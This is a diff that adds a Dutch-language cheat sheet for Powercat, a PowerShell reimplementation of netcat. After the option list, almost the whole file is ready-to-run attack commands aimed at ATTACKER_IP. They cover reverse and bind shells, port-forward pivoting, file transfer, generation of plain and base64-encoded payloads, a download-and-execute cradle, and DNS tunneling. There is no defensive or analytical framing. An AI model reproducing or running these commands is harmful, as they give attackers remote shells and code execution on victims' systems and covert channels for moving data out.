@@ -1,0 +1,58 @@
+# Powercat — PowerShell netcat (TCP/UDP, relay, file transfer, payload generatie)
+# Volledige netcat implementatie in PowerShell met extra features zoals relay en DNS
+#
+# === Syntax ===
+# powercat -c HOST -p PORT -e cmd.exe          (reverse shell)
+# powercat -l -p PORT -e cmd.exe               (bind shell)
+#
+# === Belangrijkste opties ===
+# -c HOST        Connect naar host (client mode)
+# -l             Listen mode (server)
+# -p PORT        Poortnummer
+# -e PROG        Programma uitvoeren (cmd.exe, powershell.exe)
+# -ep            Execute PowerShell (handiger dan -e powershell.exe)
+# -r RELAY       Relay naar andere host (tcp:HOST:PORT, dns:HOST:PORT)
+# -g             Genereer PowerShell payload (stand-alone script)
+# -ge            Genereer encoded payload (base64)
+# -t TIMEOUT     Timeout in seconden
+# -i INPUT       Input vanuit string
+# -o OUTPUT      Output naar string
+# -of FILE       Output naar bestand
+# -d             Disconnect na EOF
+# -dns DOMAIN    DNS mode (tunneling)
+# -dnsft         DNS file transfer mode
+# -u             UDP in plaats van TCP
+#
+# === Voorbeelden ===
+
+# Reverse shell naar attacker
+powercat -c ATTACKER_IP -p 443 -e cmd.exe
+
+# Reverse PowerShell shell
+powercat -c ATTACKER_IP -p 443 -ep
+
+# Bind shell (luistert op doelwit)
+powercat -l -p 4444 -e cmd.exe
+
+# Relay — port forward (pivot)
+powercat -l -p 443 -r tcp:TARGET:3389
+
+# File transfer — ontvangen
+powercat -l -p 4444 -of C:\temp\file.exe
+
+# File transfer — versturen
+powercat -c TARGET -p 4444 -i C:\temp\file.exe
+
+# Stand-alone payload genereren
+powercat -c ATTACKER_IP -p 443 -ep -g > payload.ps1
+
+# Encoded payload genereren (voor one-liner)
+powercat -c ATTACKER_IP -p 443 -ep -ge > encoded.txt
+
+# One-liner download en execute
+IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1'); powercat -c ATTACKER_IP -p 443 -ep
+
+# DNS tunneling mode
+powercat -c ATTACKER_IP -p 53 -dns DOMAIN -e cmd.exe
+
+# Noot: Importeer eerst met . .\powercat.ps1 of via download cradle
